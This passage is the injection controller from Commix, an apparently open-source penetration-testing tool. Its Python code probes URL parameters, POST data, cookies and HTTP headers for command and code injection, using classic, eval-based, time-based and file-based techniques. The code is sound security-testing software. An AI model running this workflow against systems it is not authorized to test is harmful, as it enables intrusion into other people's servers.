#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.modules import modules_handler
from src.core.requests import authentication
from src.core.injections.controller import checks
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind.techniques.time_based import tb_handler
from src.core.injections.semiblind.techniques.file_based import fb_handler
from src.core.injections.results_based.techniques.classic import cb_handler
from src.core.injections.results_based.techniques.eval_based import eb_handler

"""
Command Injection and exploitation controller.
Checks if the testable parameter is exploitable.
"""

def basic_level_checks():
  settings.SKIP_CODE_INJECTIONS = None
  settings.SKIP_COMMAND_INJECTIONS = None
  settings.IDENTIFIED_COMMAND_INJECTION = False
  settings.IDENTIFIED_WARNINGS = False
  settings.IDENTIFIED_PHPINFO = False

"""
Check for previously stored sessions.
"""
def check_for_stored_sessions(url, http_request_method):
  if not menu.options.ignore_session:
    if os.path.isfile(settings.SESSION_FILE) and not settings.REQUIRED_AUTHENTICATION:
      if session_handler.applied_techniques(url, http_request_method):
        settings.SESSION_APPLIED_TECHNIQUES = session_handler.applied_techniques(url, http_request_method)
        menu.options.tech = settings.SESSION_APPLIED_TECHNIQUES
      if session_handler.check_stored_parameter(url, http_request_method):
        if not settings.MULTI_TARGETS or not settings.STDIN_PARSING:
          settings.LOAD_SESSION = True
        return True

"""
Check for previously stored injection level.
"""
def check_for_stored_levels(url, http_request_method):
  if not menu.options.ignore_session:
    if menu.options.level == settings.DEFAULT_INJECTION_LEVEL:
      menu.options.level = session_handler.applied_levels(url, http_request_method)
      if type(menu.options.level) is not int :
        menu.options.level = settings.DEFAULT_INJECTION_LEVEL

"""
Heuristic request(s)
"""
def heuristic_request(url, http_request_method, check_parameter, payload, whitespace):
  data = None
  cookie = None
  tmp_url = url
  payload = parameters.prefixes(payload, prefix="")
  payload = parameters.suffixes(payload, suffix="")
  payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
  payload = checks.perform_payload_modification(payload)
  if settings.VERBOSITY_LEVEL >= 1:
    print(settings.print_payload(payload))
  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
    payload = checks.payload_fixation(payload)
    cookie = menu.options.cookie.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload).encode(settings.DEFAULT_CODEC)
  elif not settings.IGNORE_USER_DEFINED_POST_DATA and menu.options.data and settings.INJECT_TAG in menu.options.data:
    data = menu.options.data.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload).encode(settings.DEFAULT_CODEC)
  else:
    if settings.INJECT_TAG in url:
      tmp_url = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
  request = _urllib.request.Request(tmp_url, data, method=http_request_method)
  if cookie:
    request.add_header(settings.COOKIE, cookie)
  if check_parameter_in_http_header(check_parameter) and check_parameter not in settings.HOST.capitalize():
    settings.CUSTOM_HEADER_NAME = check_parameter
    if settings.INJECT_TAG in settings.CUSTOM_HEADER_VALUE:
      request.add_header(check_parameter, settings.CUSTOM_HEADER_VALUE.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload).encode(settings.DEFAULT_CODEC))
    else:
      request.add_header(check_parameter, (settings.CUSTOM_HEADER_VALUE + payload).encode(settings.DEFAULT_CODEC))
  headers.do_check(request)
  response = requests.get_request_response(request)
  return response

"""
Heuristic (basic) tests for command injection
"""
def command_injection_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers):
  check_parameter = check_parameter.lstrip().rstrip()
  if menu.options.alter_shell:
    basic_payloads = settings.ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS
  else:
    basic_payloads = settings.BASIC_COMMAND_INJECTION_PAYLOADS
  settings.CLASSIC_STATE = True
  try:
    checks.perform_payload_modification(payload="")
    for whitespace in settings.WHITESPACES:
      if not settings.IDENTIFIED_COMMAND_INJECTION or settings.MULTI_TARGETS:
        _ = 0
        for payload in basic_payloads:
          _ = _ + 1
          response = heuristic_request(url, http_request_method, check_parameter, payload, whitespace)
          if type(response) is not bool and response is not None:
            html_data = checks.page_encoding(response, action="decode")
            match = re.search(settings.BASIC_COMMAND_INJECTION_RESULT, html_data)
            if match:
              settings.IDENTIFIED_COMMAND_INJECTION = True
              possible_os = ('Unix-like', 'Windows')[_ != 1]
              if settings.OS.UNIX.lower() in possible_os.lower():
                settings.TARGET_OS = settings.OS.UNIX
              else:
                settings.TARGET_OS = settings.OS.WINDOWS
              info_msg = "Heuristic (basic) tests shows that "
              info_msg += settings.CHECKING_PARAMETER + " might be injectable (possible OS: '" + possible_os + "')."
              print(settings.print_bold_info_msg(info_msg))
              settings.SKIP_CODE_INJECTIONS = True
              break

    settings.CLASSIC_STATE = False
    return url

  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Heuristic (basic) tests for code injection warnings
"""
def code_injections_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers):
  check_parameter = check_parameter.lstrip().rstrip()
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CE
  technique = settings.INJECTION_TECHNIQUE.DYNAMIC_CODE
  technique = "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ""
  settings.EVAL_BASED_STATE = True
  try:
    whitespace = settings.SINGLE_WHITESPACE
    if (not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_PHPINFO) or settings.MULTI_TARGETS:
      for payload in settings.PHPINFO_CHECK_PAYLOADS:
        response = heuristic_request(url, http_request_method, check_parameter, payload, whitespace)
        if type(response) is not bool and response is not None:
          html_data = checks.page_encoding(response, action="decode")
          match = re.search(settings.CODE_INJECTION_PHPINFO, html_data)
          if match:
            technique = technique + " (possible PHP version: '" + match.group(1) + "')"
            settings.IDENTIFIED_PHPINFO = True
          else:
            for warning in settings.CODE_INJECTION_WARNINGS:
              if warning in html_data:
                settings.IDENTIFIED_WARNINGS = True
                break
          if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO:
            info_msg = "Heuristic (basic) tests shows that "
            info_msg += settings.CHECKING_PARAMETER + " might be injectable via " + technique + "."
            print(settings.print_bold_info_msg(info_msg))
            break

    settings.EVAL_BASED_STATE = False
    return url

  except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Check if it's exploitable via classic command injection technique.
"""
def classic_command_injection_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CI
  technique = settings.INJECTION_TECHNIQUE.CLASSIC
  settings.CLASSIC_STATE = None
  if not settings.SKIP_COMMAND_INJECTIONS:
    if (len(menu.options.tech) == 0 or "c" in menu.options.tech):
      if cb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique) != False:
        settings.CLASSIC_STATE = settings.IDENTIFIED_COMMAND_INJECTION = True
        checks.skip_testing(filename, url)
      else:
        settings.CLASSIC_STATE = False
  if settings.CLASSIC_STATE == None or settings.SKIP_COMMAND_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.CLASSIC_STATE)

"""
Check if it's exploitable via dynamic code evaluation technique.
"""
def dynamic_code_evaluation_technique(url, timesec, filename, http_request_method):
  injection_type = settings.INJECTION_TYPE.RESULTS_BASED_CE
  technique = settings.INJECTION_TECHNIQUE.DYNAMIC_CODE
  settings.EVAL_BASED_STATE = None
  if not settings.SKIP_CODE_INJECTIONS:
    if (len(menu.options.tech) == 0 or "e" in menu.options.tech):
      if eb_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique) != False:
        settings.EVAL_BASED_STATE = True
        if not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_PHPINFO:
          checks.skip_testing(filename, url)
      else:
        settings.EVAL_BASED_STATE = False
  if settings.EVAL_BASED_STATE == None or not settings.SKIP_CODE_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.EVAL_BASED_STATE)

"""
Check if it's exploitable via time-based command injection technique.
"""
def timebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response):
  injection_type = settings.INJECTION_TYPE.BLIND
  technique = settings.INJECTION_TECHNIQUE.TIME_BASED
  settings.TIME_BASED_STATE = None
  if not settings.SKIP_COMMAND_INJECTIONS:
    if (len(menu.options.tech) == 0 or "t" in menu.options.tech):
      if tb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) != False:
        settings.TIME_BASED_STATE = settings.IDENTIFIED_COMMAND_INJECTION = True
        checks.skip_testing(filename, url)
      else:
        settings.TIME_BASED_STATE = False
  if settings.TIME_BASED_STATE == None or settings.SKIP_COMMAND_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.TIME_BASED_STATE)

"""
Check if it's exploitable via file-based command injection technique.
"""
def filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response):
  injection_type = settings.INJECTION_TYPE.SEMI_BLIND
  technique = settings.INJECTION_TECHNIQUE.FILE_BASED
  settings.FILE_BASED_STATE = None
  if not settings.SKIP_COMMAND_INJECTIONS:
    if (len(menu.options.tech) == 0 or "f" in menu.options.tech):
      if fb_handler.exploitation(url, timesec, filename, http_request_method, url_time_response, injection_type, technique) != False:
        settings.FILE_BASED_STATE = settings.IDENTIFIED_COMMAND_INJECTION = True
        checks.skip_testing(filename, url)
      else:
        settings.FILE_BASED_STATE = False
  if settings.FILE_BASED_STATE == None or settings.SKIP_COMMAND_INJECTIONS:
    checks.skipping_technique(technique, injection_type, settings.FILE_BASED_STATE)

"""
Check parameter in HTTP header.
"""
def check_parameter_in_http_header(check_parameter):
  inject_http_headers = False
  if any(x in check_parameter.lower() for x in settings.HTTP_HEADERS) or \
     check_parameter.lower() in settings.CUSTOM_HEADER_NAME.lower():
    if settings.ACCEPT_VALUE not in settings.CUSTOM_HEADER_VALUE:
      inject_http_headers = True
  return inject_http_headers

"""
Proceed to the injection process for the appropriate parameter.
"""
def injection_proccess(url, check_parameter, http_request_method, filename, timesec):
  for i in range(0,int(settings.OS_CHECKS_NUM)):
    if settings.CHECK_BOTH_OS:
      if i == 0:
        settings.TARGET_OS = settings.OS.UNIX
      else:
        settings.TARGET_OS = settings.OS.WINDOWS

    if settings.PERFORM_BASIC_SCANS:
      checks.keep_testing_others(filename, url)
      basic_level_checks()

    inject_http_headers = check_parameter_in_http_header(check_parameter)
    
    # User-Agent/Referer/Host/Custom HTTP header Injection(s)
    if check_parameter.startswith(settings.SINGLE_WHITESPACE):
      header_name = ""
      the_type = "HTTP header"
      inject_parameter = " '" + check_parameter.strip() + "'"
    else:
      if settings.COOKIE_INJECTION:
        header_name = settings.COOKIE
      else:
        header_name = ""
      the_type = " parameter"
      inject_parameter = " '" + check_parameter + "'"

    # Estimating the response time (in seconds)
    timesec, url_time_response = requests.estimate_response_time(url, timesec, http_request_method)

    # Load modules
    modules_handler.load_modules(url, http_request_method, filename)
    # checks.tamper_scripts(stored_tamper_scripts=False)

    settings.CHECKING_PARAMETER = ""
    if not header_name == settings.COOKIE and not the_type == "HTTP header":
      settings.CHECKING_PARAMETER = checks.check_http_method(url)
      settings.CHECKING_PARAMETER += ('', ' JSON')[settings.IS_JSON] + ('', ' SOAP/XML')[settings.IS_XML]
    if header_name == settings.COOKIE :
       settings.CHECKING_PARAMETER += str(header_name) + str(the_type) + str(inject_parameter)
    else:
       settings.CHECKING_PARAMETER += str(the_type) + str(header_name) + str(inject_parameter)
    
    info_msg = "Setting " + settings.CHECKING_PARAMETER  + " for tests."
    print(settings.print_info_msg(info_msg))
    
    if menu.options.skip_heuristics:
      if settings.VERBOSITY_LEVEL != 0:
        debug_msg = "Skipping heuristic (basic) tests to the " + settings.CHECKING_PARAMETER + "."
        print(settings.print_debug_msg(debug_msg))
    else:
      if not settings.LOAD_SESSION:
        checks.recognise_payload(payload=settings.TESTABLE_VALUE)
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Performing heuristic (basic) tests to the " + settings.CHECKING_PARAMETER + "."
          print(settings.print_debug_msg(debug_msg))

        if not (len(menu.options.tech) == 1 and "e" in menu.options.tech):
          url = command_injection_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers)

        if not settings.IDENTIFIED_COMMAND_INJECTION and "e" in menu.options.tech:
          # Check for identified warnings
          url = code_injections_heuristic_basic(url, http_request_method, check_parameter, the_type, header_name, inject_http_headers)
          if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO:
            checks.skip_testing(filename, url)

        if not settings.IDENTIFIED_COMMAND_INJECTION and not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_PHPINFO:
          settings.HEURISTIC_TEST.POSITIVE = False
          warn_msg = "Heuristic (basic) tests shows that "
          warn_msg += settings.CHECKING_PARAMETER + " might not be injectable."
          print(settings.print_bold_warning_msg(warn_msg))

    if (menu.options.smart and not settings.HEURISTIC_TEST.POSITIVE) or (menu.options.smart and menu.options.skip_heuristics):
      info_msg = "Skipping "
      info_msg += settings.CHECKING_PARAMETER + "."
      print(settings.print_info_msg(info_msg))
      settings.HEURISTIC_TEST.POSITIVE = True
    else:
      if menu.options.failed_tries and \
         menu.options.tech and not "f" in menu.options.tech and not \
         menu.options.failed_tries:
        warn_msg = "Due to the provided (unsuitable) injection technique"
        warn_msg += "s"[len(menu.options.tech) == 1:][::-1] + ", "
        warn_msg += "the option '--failed-tries' will be ignored."
        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)

      # Procced with file-based semiblind command injection technique,
      # once the user provides the path of web server's root directory.
      if menu.options.web_root and \
         menu.options.tech and not "f" in menu.options.tech:
          if not menu.options.web_root.endswith("/"):
             menu.options.web_root =  menu.options.web_root + "/"
          if checks.procced_with_file_based_technique():
            menu.options.tech = "f"

      classic_command_injection_technique(url, timesec, filename, http_request_method)
      dynamic_code_evaluation_technique(url, timesec, filename, http_request_method)
      timebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response)
      filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response)

      # All injection techniques seems to be failed!
      if checks.injection_techniques_status() == False:
        warn_msg = "The tested "
        warn_msg += settings.CHECKING_PARAMETER
        warn_msg += " does not seem to be injectable."
        print(settings.print_bold_warning_msg(warn_msg))

    if not settings.CHECK_BOTH_OS:
      break

"""
Inject HTTP headers (User-agent / Referer / Host) (if level > 2).
"""
def http_headers_injection(url, http_request_method, filename, timesec):
  # Disable Cookie Injection
  settings.COOKIE_INJECTION = None

  def user_agent_injection(url, http_request_method, filename, timesec):
    user_agent = menu.options.agent
    if not menu.options.shellshock:
      menu.options.agent = menu.options.agent + settings.INJECT_TAG
    settings.USER_AGENT_INJECTION = True
    if settings.USER_AGENT_INJECTION:
      check_parameter = header_name = settings.SINGLE_WHITESPACE + settings.USER_AGENT
      settings.HTTP_HEADER = header_name[1:].replace("-", "").lower()
      check_for_stored_sessions(url, http_request_method)
      if not injection_proccess(url, check_parameter, http_request_method, filename, timesec):
        settings.USER_AGENT_INJECTION = None
    menu.options.agent = user_agent

  def referer_injection(url, http_request_method, filename, timesec):
    referer = menu.options.referer
    if not menu.options.shellshock:
      if menu.options.referer is None:
        menu.options.referer = _urllib.parse.urljoin(url, _urllib.parse.urlparse(url).path)
      menu.options.referer = menu.options.referer + settings.INJECT_TAG
    settings.REFERER_INJECTION = True
    if settings.REFERER_INJECTION:
      check_parameter = header_name = settings.SINGLE_WHITESPACE + settings.REFERER
      settings.HTTP_HEADER = header_name[1:].lower()
      check_for_stored_sessions(url, http_request_method)
      if not injection_proccess(url, check_parameter, http_request_method, filename, timesec):
        settings.REFERER_INJECTION = False
    menu.options.agent = referer

  def host_injection(url, http_request_method, filename, timesec):
    host = menu.options.host
    if menu.options.host is None:
      menu.options.host = _urllib.parse.urlparse(url).netloc
    menu.options.host = menu.options.host + settings.INJECT_TAG
    settings.HOST_INJECTION = True
    if settings.HOST_INJECTION:
      check_parameter = header_name = settings.SINGLE_WHITESPACE + settings.HOST
      settings.HTTP_HEADER = header_name[1:].lower()
      check_for_stored_sessions(url, http_request_method)
      if not injection_proccess(url, check_parameter, http_request_method, filename, timesec):
        settings.HOST_INJECTION = False
    menu.options.host = host

  if not any((settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION, settings.HOST_INJECTION)) and \
    menu.options.test_parameter == None and \
    menu.options.skip_parameter == None:
    user_agent_injection(url, http_request_method, filename, timesec)
    referer_injection(url, http_request_method, filename, timesec)
    host_injection(url, http_request_method, filename, timesec)
  else:
    # User-Agent HTTP header injection
    if settings.USER_AGENT_INJECTION or \
      menu.options.test_parameter and settings.USER_AGENT.lower() in menu.options.test_parameter.lower() or \
      menu.options.skip_parameter and settings.USER_AGENT.lower() not in menu.options.skip_parameter.lower():
      user_agent_injection(url, http_request_method, filename, timesec)
    # Referer HTTP header injection
    if settings.REFERER_INJECTION or \
      menu.options.test_parameter and settings.REFERER.lower() in menu.options.test_parameter.lower() or \
      menu.options.skip_parameter and settings.REFERER.lower() not in menu.options.skip_parameter.lower():
      referer_injection(url, http_request_method, filename, timesec)
    # Host HTTP header injection
    if settings.HOST_INJECTION or \
      menu.options.test_parameter and settings.HOST.lower() in menu.options.test_parameter.lower() or \
      menu.options.skip_parameter and settings.HOST.lower() not in menu.options.skip_parameter.lower():
      host_injection(url, http_request_method, filename, timesec)

"""
Check for stored injections on User-agent / Referer headers (if level > 2).
"""
def stored_http_header_injection(url, check_parameter, http_request_method, filename, timesec):

  for check_parameter in settings.HTTP_HEADERS:
    settings.HTTP_HEADER = check_parameter
    if check_for_stored_sessions(url, http_request_method):
      if check_parameter == settings.REFERER:
        menu.options.referer = settings.INJECT_TAG
        settings.REFERER_INJECTION = True
      elif check_parameter == settings.HOST.lower():
        menu.options.host= settings.INJECT_TAG
        settings.HOST_INJECTION = True
      else:
        menu.options.agent = settings.INJECT_TAG
        settings.USER_AGENT_INJECTION = True
      injection_proccess(url, check_parameter, http_request_method, filename, timesec)

  if not settings.LOAD_SESSION:
    http_headers_injection(url, http_request_method, filename, timesec)


"""
Cookie injection
"""
def cookie_injection(url, http_request_method, filename, timesec):

  settings.COOKIE_INJECTION = True
  
  # Cookie Injection
  if settings.COOKIE_INJECTION:
    cookie_value = menu.options.cookie
    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
    settings.HTTP_HEADER = header_name[1:].lower()
    cookie_parameters = parameters.do_cookie_check(menu.options.cookie)
    if type(cookie_parameters) is str:
      cookie_parameters_list = []
      cookie_parameters_list.append(cookie_parameters)
      cookie_parameters = cookie_parameters_list

    # Remove whitespaces
    cookie_parameters = [x.replace(settings.SINGLE_WHITESPACE, "") for x in cookie_parameters]

    check_parameters = []
    for i in range(0, len(cookie_parameters)):
      menu.options.cookie = cookie_parameters[i]
      check_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
      check_parameters.append(check_parameter)
      
    checks.testable_parameters(url, check_parameters, header_name)

    for i in range(0, len(cookie_parameters)):
      parameter = menu.options.cookie = cookie_parameters[i]
      check_parameter = parameters.specify_cookie_parameter(parameter)
      if check_parameter != parameter:
        if len(check_parameter) > 0:
          settings.TESTABLE_PARAMETER = check_parameter
        # Check if testable parameter(s) are provided
        if len(settings.TEST_PARAMETER) > 0:
          if menu.options.test_parameter != None:
            param_counter = 0
            for check_parameter in check_parameters:
              if settings.TEST_PARAMETER.count(check_parameter) != 0:
                menu.options.cookie = cookie_parameters[param_counter]
                check_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                # Check for session file
                check_for_stored_sessions(url, http_request_method)
                injection_proccess(url, check_parameter, http_request_method, filename, timesec)
              param_counter += 1
            break
          else:
            # Check for session file
            check_for_stored_sessions(url, http_request_method)
            injection_proccess(url, check_parameter, http_request_method, filename, timesec)
        else:
          # Check for session file
          check_for_stored_sessions(url, http_request_method)
          injection_proccess(url, check_parameter, http_request_method, filename, timesec)

  if settings.COOKIE_INJECTION == True:
    # Restore cookie value
    menu.options.cookie = cookie_value
    # Disable cookie injection
    settings.COOKIE_INJECTION = False

"""
Check if HTTP Method is GET.
"""
def get_request(url, http_request_method, filename, timesec):

  found_url = parameters.do_GET_check(url, http_request_method)
  if found_url != False:

    check_parameters = []
    for i in range(0, len(found_url)):
      url = found_url[i]
      check_parameter = parameters.vuln_GET_param(url)
      check_parameters.append(check_parameter)

    header_name = ""
    checks.testable_parameters(url, check_parameters, header_name)

    for i in range(0, len(found_url)):
      url = found_url[i]
      check_parameter = parameters.vuln_GET_param(url)
      if check_parameter != url and check_parameter not in settings.SKIP_PARAMETER:
        if len(check_parameter) > 0:
          settings.TESTABLE_PARAMETER = check_parameter
        # Check if testable parameter(s) are provided
        if len(settings.TESTABLE_PARAMETER) > 0:
          if menu.options.test_parameter != None:
            url_counter = 0
            for check_parameter in check_parameters:
              if settings.TEST_PARAMETER.count(check_parameter) != 0:
                url = found_url[url_counter]
                check_parameter = parameters.vuln_GET_param(url)
                # Check for session file
                check_for_stored_sessions(url, http_request_method)
                injection_proccess(url, check_parameter, http_request_method, filename, timesec)
              url_counter += 1
            break
          else:
            # Check for session file
            check_for_stored_sessions(url, http_request_method)
            injection_proccess(url, check_parameter, http_request_method, filename, timesec)
        else:
          # Check for session file
          check_for_stored_sessions(url, http_request_method)
          injection_proccess(url, check_parameter, http_request_method, filename, timesec)

"""
Check if HTTP Method is POST.
"""
def post_request(url, http_request_method, filename, timesec):

  parameter = settings.USER_DEFINED_POST_DATA
  found_parameter = parameters.do_POST_check(parameter, http_request_method)

  # Check if singe entry parameter
  if type(found_parameter) is str:
    found_parameter_list = []
    found_parameter_list.append(found_parameter)
    found_parameter = found_parameter_list

  if settings.IS_JSON or settings.IS_XML:
    # Remove junk data
    found_parameter = [x for x in found_parameter if settings.INJECT_TAG in x]
  else:
    # Remove whitespaces
    found_parameter = [x.replace(settings.SINGLE_WHITESPACE, "") for x in found_parameter]

  # Check if multiple parameters
  check_parameters = []
  for i in range(0, len(found_parameter)):
    parameter = menu.options.data = found_parameter[i]
    check_parameter = parameters.vuln_POST_param(parameter, url)
    check_parameters.append(check_parameter)

  header_name = ""
  checks.testable_parameters(url, check_parameters, header_name)

  for i in range(0, len(found_parameter)):
    #if settings.INJECT_TAG in found_parameter[i]:
    parameter = menu.options.data = found_parameter[i]
    check_parameter = parameters.vuln_POST_param(parameter, url)
    if check_parameter != parameter and check_parameter not in settings.SKIP_PARAMETER:
      if len(check_parameter) > 0:
        settings.TESTABLE_PARAMETER = check_parameter
      # Check if testable parameter(s) are provided
      if len(settings.TESTABLE_PARAMETER) > 0:
        if menu.options.test_parameter != None:
          param_counter = 0
          for check_parameter in check_parameters:
            if settings.TEST_PARAMETER.count(check_parameter) != 0:
              menu.options.data = found_parameter[param_counter]
              check_parameter = parameters.vuln_POST_param(menu.options.data, url)
              # Check for session file
              check_for_stored_sessions(url, http_request_method)
              injection_proccess(url, check_parameter, http_request_method, filename, timesec)
            param_counter += 1
          break
        else:
          # Check for session file
          check_for_stored_sessions(url, http_request_method)
          injection_proccess(url, check_parameter, http_request_method, filename, timesec)
      else:
        # Check for session file
        check_for_stored_sessions(url, http_request_method)
        injection_proccess(url, check_parameter, http_request_method, filename, timesec)

"""
Perform GET / POST parameters checks
"""
def data_checks(url, http_request_method, filename, timesec):
  settings.COOKIE_INJECTION = None
  settings.HTTP_HEADERS_INJECTION = False
  settings.CUSTOM_HEADER_INJECTION = False

  if settings.USER_DEFINED_POST_DATA and not settings.IGNORE_USER_DEFINED_POST_DATA:
    if post_request(url, http_request_method, filename, timesec) is None:
      if not settings.SKIP_NON_CUSTOM:
        get_request(url, http_request_method, filename, timesec)
  else:
    if get_request(url, http_request_method, filename, timesec) is None:
      if settings.USER_DEFINED_POST_DATA:
        if not settings.SKIP_NON_CUSTOM:
          post_request(url, http_request_method, filename, timesec) 

"""
Perform checks over cookie values.
"""
def cookies_checks(url, http_request_method, filename, timesec): 
  if len([i for i in settings.TEST_PARAMETER if i in str(menu.options.cookie)]) != 0 or settings.COOKIE_INJECTION:
    if not settings.SKIP_NON_CUSTOM:
      cookie_injection(url, http_request_method, filename, timesec)

"""
Perform checks over HTTP Headers parameters.
"""
def headers_checks(url, http_request_method, filename, timesec):
  if len([i for i in settings.TEST_PARAMETER if i in settings.HTTP_HEADERS]) != 0 or settings.HTTP_HEADERS_INJECTION or any((settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION, settings.HOST_INJECTION)):
    if not settings.SKIP_NON_CUSTOM:
      http_headers_injection(url, http_request_method, filename, timesec)

"""
Perform checks over custom HTTP Headers parameters.
"""
def custom_headers_checks(url, http_request_method, filename, timesec): 
  for _ in settings.CUSTOM_HEADERS_NAMES:
    if settings.CUSTOM_INJECTION_MARKER_CHAR in _.split(": ")[1] and not settings.CUSTOM_INJECTION_MARKER:
      settings.CUSTOM_HEADER_INJECTION = False
    else:
      settings.CUSTOM_HEADER_NAME = _.split(": ")[0]
      settings.CUSTOM_HEADER_VALUE = _.split(": ")[1].replace(settings.CUSTOM_INJECTION_MARKER_CHAR,"")
      check_parameter = header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME
      settings.HTTP_HEADER = header_name[1:].lower()
      check_for_stored_sessions(url, http_request_method)
      injection_proccess(url, check_parameter, http_request_method, filename, timesec)
  settings.CUSTOM_HEADER_INJECTION = False

"""
Perform checks
"""
def perform_checks(url, http_request_method, filename):
  # Initiate whitespaces
  if settings.MULTI_TARGETS or settings.STDIN_PARSING and len(settings.WHITESPACES) > 1:
    settings.WHITESPACES = ["%20"]

  timesec = settings.TIMESEC
  # Check if authentication is needed.
  if menu.options.auth_url and menu.options.auth_data:
    # Do the authentication process.
    authentication.authentication_process(http_request_method)
    try:
      # Check if authentication page is the same with the next (injection) URL
      if _urllib.request.urlopen(url, timeout=settings.TIMEOUT).read() == _urllib.request.urlopen(menu.options.auth_url, timeout=settings.TIMEOUT).read():
        err_msg = "It seems that the authentication procedure has failed."
        print(settings.print_critical_msg(err_msg))
        raise SystemExit()
    except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
      print(settings.print_critical_msg(err_msg))
      raise SystemExit()
  elif menu.options.auth_url or menu.options.auth_data:
    err_msg = "You must specify both login panel URL and login parameters."
    print(settings.print_critical_msg(err_msg))
    raise SystemExit()
  else:
    pass

  if menu.options.shellshock:
    menu.options.level = settings.HTTP_HEADER_INJECTION_LEVEL
  else:
    if menu.options.level != settings.DEFAULT_INJECTION_LEVEL and settings.CUSTOM_INJECTION_MARKER != True:
      menu.options.level = settings.USER_SUPPLIED_LEVEL
    check_for_stored_levels(url, http_request_method)

  _ = True
  if settings.CUSTOM_INJECTION_MARKER:
    _ = False
    if any((settings.INJECTION_MARKER_LOCATION.URL, settings.INJECTION_MARKER_LOCATION.DATA)):
      data_checks(url, http_request_method, filename, timesec)
    if settings.INJECTION_MARKER_LOCATION.COOKIE:
      cookies_checks(url, http_request_method, filename, timesec)
    if settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS:
      headers_checks(url, http_request_method, filename, timesec)
    if settings.INJECTION_MARKER_LOCATION.CUSTOM_HTTP_HEADERS:
      custom_headers_checks(url, http_request_method, filename, timesec)
    if settings.USER_DEFINED_POST_DATA and not settings.INJECTION_MARKER_LOCATION.DATA \
      or settings.USER_DEFINED_URL_DATA and not settings.INJECTION_MARKER_LOCATION.URL:
      checks.process_non_custom()

  if not settings.SKIP_NON_CUSTOM:
    settings.CUSTOM_INJECTION_MARKER = False
    if not settings.INJECTION_MARKER_LOCATION.URL or not settings.INJECTION_MARKER_LOCATION.DATA:
      data_checks(url, http_request_method, filename, timesec)
    if _:
      if not settings.INJECTION_MARKER_LOCATION.COOKIE and menu.options.level >= settings.COOKIE_INJECTION_LEVEL and menu.options.cookie:
        settings.COOKIE_INJECTION = True
        cookies_checks(url, http_request_method, filename, timesec)
      if not settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS and menu.options.level > settings.COOKIE_INJECTION_LEVEL:
        settings.HTTP_HEADERS_INJECTION = True
        headers_checks(url, http_request_method, filename, timesec)

  if settings.INJECTION_CHECKER == False:
    return False
  else:
    return True

"""
General check on every injection technique.
"""
def do_check(url, http_request_method, filename):
  try:
    if settings.RECHECK_FILE_FOR_EXTRACTION:
      settings.RECHECK_FILE_FOR_EXTRACTION = False

    # Check for '--tor' option.
    if menu.options.tor:
      if not menu.options.tech or "t" in menu.options.tech or "f" in menu.options.tech:
        warn_msg = "It is highly recommended to avoid usage of switch '--tor' for "
        warn_msg += "time-based injections because of inherent high latency time."
        print(settings.print_warning_msg(warn_msg))

    # Check for "backticks" tamper script.
    if settings.USE_BACKTICKS == True:
      if not menu.options.tech or "e" in menu.options.tech or "t" in menu.options.tech or "f" in menu.options.tech:
        warn_msg = "Commands substitution using backtics is only supported by the (results-based) classic command injection technique. "
        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)

    perform_checks(url, http_request_method, filename)
      
    # All injection techniques seems to be failed!
    if not settings.INJECTION_CHECKER:
